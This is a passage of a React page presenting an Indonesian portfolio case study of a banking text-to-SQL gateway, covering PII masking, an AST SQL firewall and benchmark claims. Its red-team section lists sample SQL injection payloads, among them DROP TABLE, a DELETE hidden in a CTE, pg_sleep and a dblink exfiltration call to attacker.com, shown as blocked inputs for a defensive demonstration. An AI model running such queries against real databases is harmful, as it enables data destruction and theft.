                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap font-medium">
                      ISO 27001 & UU PDP Compliant
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Menerapkan pengamanan ganda pasca-eksekusi:
                    <ul className="list-disc pl-5 mt-2 space-y-1 text-xs text-zinc-600">
                      <li><strong>Gate 1 (Ringkasan Eksekutif LLM):</strong> Seluruh kolom PII (<code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">nik</code>, <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">customer_name</code>, <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">account_number</code>) dihapus secara mutlak dari dataframe sebelum diserahkan ke model peringkas analitik.</li>
                      <li><strong>Gate 2 (Tampilan Visual Frontline):</strong> Dataframe di layar pengguna disajikan dengan teknik pseudonimisasi visual (contoh: NIK disamarkan menjadi <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">340401******0001</code> dan nama diubah menjadi <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">[NASABAH_01]</code>).</li>
                      <li>Dilengkapi pencatatan log audit akses berstandar ISO 27001 untuk setiap aksi kueri.</li>
                    </ul>
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Mekanisme: Double-Gated Dataframe Sanitization</span>
                    <span className="font-semibold text-neutral-900">Zero Unmasked PII at Rest</span>
                  </div>
                </div>

              </div>
            </section>

            {/* ======================================================== */}
            {/* SECTION 3: CODE IMPLEMENTATION                           */}
            {/* ======================================================== */}
            <section id="code-implementation" className="space-y-6 scroll-mt-10">
              <h2 className="text-2xl font-bold tracking-tight text-zinc-950 border-b border-zinc-200 pb-3">
                03. Implementasi Produksi Kompiler AST & Privacy Vault
              </h2>
              <p>
                Berikut potongan kode produksi yang mengimplementasikan kelima lapisan proteksi secara deterministik:
              </p>

              <div className="space-y-4">
                <CodeBlock
                  filename="src/gateway/pii_shield.py"
                  language="python"
                  code={codeLayer1}
                />

                <CodeBlock
                  filename="src/gateway/ast_guard.py"
                  language="python"
                  code={codeLayer3}
                />

                <CodeBlock
                  filename="src/gateway/parameter_bridge.py"
                  language="python"
                  code={codeLayer4}
                />

                <CodeBlock
                  filename="src/gateway/outbound_masker.py"
                  language="python"
                  code={codeLayer5}
                />
              </div>
            </section>

            {/* ======================================================== */}
            {/* SECTION 4: RED-TEAM EVALUATION & BENCHMARKS             */}
            {/* ======================================================== */}
            <section id="red-team-evaluation" className="space-y-6 scroll-mt-10">
              <h2 className="text-2xl font-bold tracking-tight text-zinc-950 border-b border-zinc-200 pb-3">
                04. Evaluasi Kuantitatif Tolok Ukur & Uji Red-Teaming
              </h2>
              <p>
                Sistem diuji menggunakan modul pengujian otomatis terhadap <strong className="text-zinc-900 font-semibold">60 skenario kueri ekstrem</strong> yang mencakup pengujian penetrasi keamanan dan kueri analitik riil:
              </p>

              {/* Benchmark Table */}
              <div className="rounded-xl border border-zinc-200 bg-white overflow-hidden shadow-xs my-6">
                <div className="p-4 bg-zinc-50 border-b border-zinc-200 flex items-center justify-between">
                  <span className="text-xs font-mono font-bold uppercase tracking-wider text-zinc-700">
                    Hasil Pengujian Empiris 60 Skenario Kueri
                  </span>
                  <span className="text-[11px] font-mono text-zinc-500">
                    Target: Core Banking Data Mart
                  </span>
                </div>
                
                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs font-mono">
                    <thead className="bg-zinc-100/70 border-b border-zinc-200 text-zinc-700">
                      <tr>
                        <th className="p-3.5 font-bold">Dimensi Pengujian</th>
                        <th className="p-3.5 font-bold">Cakupan Dataset Uji</th>
                        <th className="p-3.5 font-bold">Nilai Terverifikasi</th>
                        <th className="p-3.5 font-bold text-emerald-800 bg-emerald-50/50">Status Pengujian</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-zinc-200 text-zinc-600">
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Layer 1: PII Zero-Leak Recall</td>
                        <td className="p-3.5">15 Proba PII (NIK Dukcapil, Nama, No. Rek, Telepon)</td>
                        <td className="p-3.5 font-bold text-emerald-700">100.0% Recall</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">15 / 15 Lolos (0 PII Bocor ke LLM)</td>
                      </tr>
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Layer 3: Red-Team Attack Mitigation</td>
                        <td className="p-3.5">15 Vektor Serangan Destruktif (DDL/DML/CTE/DoS)</td>
                        <td className="p-3.5 font-bold text-emerald-700">100.0% Termitigasi</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">15 / 15 Diblokir Kompiler AST</td>
                      </tr>
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Layer 2: Valid SQL Syntax Rate (VSR)</td>
                        <td className="p-3.5">30 Skenario Kueri Bisnis Kompleks (Agregasi, Filter)</td>
                        <td className="p-3.5 font-bold text-emerald-700">100.0% Valid SQL</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">30 / 30 Kueri Bebas Error Sintaks</td>
                      </tr>
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Database Runtime Execution Success (ESR)</td>
                        <td className="p-3.5">30 Skenario Kueri Nyata Perbankan</td>
                        <td className="p-3.5 font-bold text-emerald-700">100.0% Success Rate</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">30 / 30 Kueri Bebas Runtime Crash</td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                <div className="p-3.5 bg-zinc-50 border-t border-zinc-200 text-xs text-zinc-500 leading-relaxed font-sans">
                  <strong>Catatan Metodologi Rekayasa:</strong> Pengujian benchmark formal membuktikan bahwa overhead latensi komputasi gateway lokal (PII Shield + AST Compiler + Parameter Bridge + Masker) beroperasi sangat ringan dengan rata-rata <strong>1.93 ms (&lt; 2 milidetik)</strong>. Inferensi end-to-end yang melibatkan koneksi API cloud Gemini diselesaikan secara real-time dalam rentang <strong>1.8s – 3.0s</strong>.
                </div>
              </div>

              {/* Vektor Serangan Yang Berhasil Dinetralkan */}
              <div className="space-y-3 pt-2">
                <h3 className="text-base font-bold text-zinc-900">
                  Vektor Serangan Red-Team yang Berhasil Dinetralkan oleh AST Firewall:
                </h3>
                <div className="space-y-2 font-mono text-xs">
                  <div className="p-3 bg-red-50/60 border border-red-200/80 rounded-lg flex items-center justify-between">
                    <span className="text-red-900 font-semibold">1. DROP TABLE customers;</span>
                    <span className="text-red-700 text-[11px] font-sans">→ Ditolak oleh Root Statement Assertion</span>
                  </div>
                  <div className="p-3 bg-red-50/60 border border-red-200/80 rounded-lg flex items-center justify-between">
                    <span className="text-red-900 font-semibold">2. WITH deleted AS (DELETE FROM accounts RETURNING *) SELECT * FROM deleted;</span>
                    <span className="text-red-700 text-[11px] font-sans">→ Ditolak oleh Recursive Node Traversal (exp.Delete)</span>
                  </div>
                  <div className="p-3 bg-red-50/60 border border-red-200/80 rounded-lg flex items-center justify-between">
                    <span className="text-red-900 font-semibold">3. SELECT * FROM accounts; DROP TABLE transactions;</span>
                    <span className="text-red-700 text-[11px] font-sans">→ Ditolak oleh Statement Chaining Detector</span>
                  </div>
                  <div className="p-3 bg-red-50/60 border border-red-200/80 rounded-lg flex items-center justify-between">
                    <span className="text-red-900 font-semibold">4. SELECT pg_sleep(15);</span>
                    <span className="text-red-700 text-[11px] font-sans">→ Ditolak oleh Function Blacklist Engine</span>
                  </div>
                  <div className="p-3 bg-red-50/60 border border-red-200/80 rounded-lg flex items-center justify-between">
                    <span className="text-red-900 font-semibold">5. SELECT dblink('host=attacker.com', 'SELECT * FROM customers');</span>
                    <span className="text-red-700 text-[11px] font-sans">→ Ditolak oleh External Exfiltration Filter</span>
                  </div>
                  <div className="p-3 bg-red-50/60 border border-red-200/80 rounded-lg flex items-center justify-between">
                    <span className="text-red-900 font-semibold">6. SELECT current_user, session_user, version();</span>
                    <span className="text-red-700 text-[11px] font-sans">→ Ditolak oleh System Variable &amp; Fingerprinting Guard</span>
                  </div>
                </div>
              </div>
            </section>

            {/* ======================================================== */}
            {/* SECTION 5: OPERATIONAL IMPACT                            */}
            {/* ======================================================== */}
            <section id="operational-impact" className="space-y-6 scroll-mt-10">
              <h2 className="text-2xl font-bold tracking-tight text-zinc-950 border-b border-zinc-200 pb-3">
                05. Dampak Operasional & Komersial
              </h2>

              {/* Impact Comparison Table */}
              <div className="rounded-xl border border-zinc-200 bg-white overflow-hidden shadow-xs my-6">
                <div className="p-4 bg-zinc-50 border-b border-zinc-200 flex items-center justify-between">
                  <span className="text-xs font-mono font-bold uppercase tracking-wider text-zinc-700">
                    Komparasi Metrik Operasional BI
                  </span>
                  <span className="text-[11px] font-mono text-zinc-500">
                    Sebelum vs Sesudah Sentra-SafeQuery
                  </span>
                </div>
                
                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs font-mono">
                    <thead className="bg-zinc-100/70 border-b border-zinc-200 text-zinc-700">
                      <tr>
                        <th className="p-3.5 font-bold">Parameter Operasional</th>
                        <th className="p-3.5 font-bold">Alur Kerja BI Konvensional</th>
                        <th className="p-3.5 font-bold">Platform Sentra-SafeQuery</th>
                        <th className="p-3.5 font-bold text-emerald-800 bg-emerald-50/50">Peningkatan Terukur</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-zinc-200 text-zinc-600">
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">SLA Turnaround Laporan Ad-Hoc</td>
                        <td className="p-3.5 text-zinc-500">14 Hari (Antrean Tiket IT Central)</td>
                        <td className="p-3.5 font-semibold text-zinc-900">Real-Time (&lt; 3 Detik)</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">Efisiensi SLA ~99.9%</td>
                      </tr>
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Hambatan Keterampilan Teknis</td>
                        <td className="p-3.5 text-zinc-500">Wajib menguasai sintaks SQL</td>
                        <td className="p-3.5">Bahasa Indonesia sehari-hari</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">100% Inklusif untuk Staf Non-IT</td>
                      </tr>
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Risiko Kebocoran PII ke Cloud AI</td>
                        <td className="p-3.5 text-red-600">Risiko Tinggi (Data Mentah)</td>
                        <td className="p-3.5 font-bold text-emerald-700">0% (Tokenisasi Ephemeral SessionVault)</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">100% Patuh Regulasi UU PDP</td>
                      </tr>
                      <tr className="hover:bg-zinc-50/50 transition-colors">
                        <td className="p-3.5 font-bold text-zinc-900">Risiko Eksekusi Kueri Destruktif</td>
                        <td className="p-3.5 text-red-600">Rentan pada agent LLM biasa</td>
                        <td className="p-3.5 font-bold text-emerald-700">0% Mutasi Basis Data</td>
                        <td className="p-3.5 font-bold text-emerald-700 bg-emerald-50/30">Zero Compromise via AST Guard</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>

              {/* 3 Metric Highlight Cards */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <div className="p-4 rounded-xl border border-zinc-200 bg-white">
                  <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                    SLA Turnaround Time
                  </div>
                  <div className="text-xl font-bold text-zinc-900 font-mono">
                    Real-Time (&lt; 3s)
                  </div>
                  <div className="text-xs text-zinc-500 mt-1">
                    vs 14 hari waktu tunggu tiket tim data pusat (Gateway overhead &lt; 2ms)
                  </div>
                </div>

                <div className="p-4 rounded-xl border border-zinc-200 bg-white">
                  <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                    Preservasi Privasi (UU PDP)
                  </div>
                  <div className="text-xl font-bold text-emerald-700 font-mono">
                    0% PII Exposure
                  </div>
                  <div className="text-xs text-zinc-500 mt-1">
                    100% recall proteksi NIK (Pria &amp; Wanita Dukcapil), rekening &amp; nama
                  </div>
                </div>

                <div className="p-4 rounded-xl border border-zinc-200 bg-white">
                  <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                    Pencegahan Mutasi
                  </div>
                  <div className="text-xl font-bold text-purple-700 font-mono">
                    100% Zero-Mutation
                  </div>
                  <div className="text-xs text-zinc-500 mt-1">
                    Seluruh vektor serangan DDL/DML/CTE/DoS diblokir mutlak
                  </div>
                </div>
              </div>
            </section>

            {/* ======================================================== */}
            {/* SECTION 6: ENGINEERING TAKEAWAYS                         */}
            {/* ======================================================== */}
            <section id="takeaways" className="space-y-6 scroll-mt-10">
              <h2 className="text-2xl font-bold tracking-tight text-zinc-950 border-b border-zinc-200 pb-3">
                06. Ringkasan Rekayasa & Relevansi Industri Perbankan
              </h2>
              <p>
                Pembangunan Sentra-SafeQuery ini menghasilkan tiga kesimpulan arsitektur utama untuk ekosistem AI perbankan berisiko tinggi:
              </p>

              {/* Takeaways Stack Cards */}
              <div className="space-y-4 my-6">
                
                {/* TAKEAWAY 1 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Prinsip 01 // Compiler-Grade Security
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5 flex items-center gap-2">
                        <Terminal className="w-4 h-4 text-purple-600" />
                        Keamanan LLM Tingkat Kompiler (AST Parsing)
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap">
                      Beyond Regex Filter
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Membuktikan bahwa filtrasi berbasis regex sederhana tidak memadai untuk sistem perbankan berisiko tinggi. Parsing pohon sintaksis (AST) menggunakan <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">sqlglot</code> adalah standar minimum mutlak untuk memvalidasi dan mengendalikan luaran SQL model AI dari ancaman injeksi terselubung.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Hasil: Eliminasi Manipulasi Destruktif</span>
                    <span className="font-semibold text-neutral-900">Deterministic Structural Validation</span>
                  </div>
                </div>

                {/* TAKEAWAY 2 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Prinsip 02 // Regulatory Architecture
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5 flex items-center gap-2">
                        <ShieldCheck className="w-4 h-4 text-emerald-600" />
                        Kepatuhan Privasi Berbasis Desain (Privacy by Design)
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap">
                      UU PDP No. 27/2022
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Mengintegrasikan mandat hukum UU PDP No. 27/2022 secara langsung ke dalam arsitektur teknis melalui tokenisasi dinamis <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">SessionVault</code> dan mekanisme pengamanan ganda (<em>dual-gate outbound masking</em>) yang menjamin kerahasiaan data nasabah tanpa mengorbankan utilitas analitik.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Hasil: Kepatuhan Hukum Perbankan</span>
                    <span className="font-semibold text-neutral-900">Zero PII Cloud Exposure Guarantee</span>
                  </div>
                </div>

                {/* TAKEAWAY 3 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Prinsip 03 // Domain Empowerment
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5 flex items-center gap-2">
                        <KeyRound className="w-4 h-4 text-blue-600" />
                        Penyelarasan Domain Bahasa Operasional Lapangan
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap">
                      Frontline Inclusion
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Menghubungkan intuisi komersial staf operasional garis depan (Mantri Bank) dengan sistem data warehousing perbankan tanpa mengharuskan mereka mempelajari sintaks SQL yang kompleks, meningkatkan kecepatan pengambilan keputusan bisnis mikro secara eksponensial.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Hasil: Demokratisasi Data Frontline</span>
                    <span className="font-semibold text-neutral-900">Immediate Ad-Hoc Commercial Insights</span>
                  </div>
                </div>

              </div>

              {/* Back to Home Action Footer */}
              <div className="pt-8 border-t border-neutral-200 flex items-center justify-between">
                <Link
                  href="/#selected-work"
                  className="inline-flex items-center gap-2 text-xs font-mono font-semibold text-neutral-900 hover:text-neutral-600 transition-colors"
                >
                  <ArrowLeft className="w-3.5 h-3.5" />
                  <span>Kembali ke Ringkasan Portofolio</span>
                </Link>
                <a
                  href="#bottlenecks"
                  className="text-xs font-mono text-neutral-400 hover:text-neutral-700 transition-colors"
                >
                  Back to Top ↑
                </a>
              </div>
            </section>

          </article>
        </div>
      </main>
    </div>
  );
}
